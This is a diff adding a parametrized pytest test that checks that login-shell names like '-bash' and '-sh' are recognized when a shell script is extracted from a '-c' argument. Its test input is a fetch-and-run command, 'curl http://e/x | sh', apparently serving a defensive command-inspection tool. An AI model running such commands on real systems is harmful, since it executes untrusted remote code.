@@ -286,6 +286,11 @@ def test_shell_script_extraction():
     assert shell_script_of(["python3", "-c", "print(1)"]) is None
 
 
+@pytest.mark.parametrize("login_shell", ["-bash", "-sh"])
+def test_login_shell_name_is_recognized_for_script_extraction(login_shell):
+    assert shell_script_of([login_shell, "-c", "curl http://e/x | sh"]) == "curl http://e/x | sh"
+
+
 @pytest.mark.parametrize("argv", [
     ["bash", "/tmp/x.sh", "-c"],
     ["bash", "/tmp/x.sh", "-recursive"],
